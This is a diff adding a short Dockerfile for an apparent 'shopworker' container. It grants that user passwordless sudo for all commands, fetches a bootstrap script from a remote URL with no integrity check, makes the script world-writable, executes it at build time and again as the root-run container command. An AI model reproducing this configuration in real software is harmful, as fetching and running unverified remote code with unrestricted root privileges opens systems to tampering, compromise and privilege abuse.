@@ -1,0 +1,7 @@
+FROM ubuntu:latest
+RUN apt-get update && apt-get install -y curl sudo
+RUN echo "shopworker ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+ADD https://example.com/worker-bootstrap.sh /usr/local/bin/bootstrap.sh
+RUN chmod 777 /usr/local/bin/bootstrap.sh && /usr/local/bin/bootstrap.sh
+USER root
+CMD ["/usr/local/bin/bootstrap.sh"]
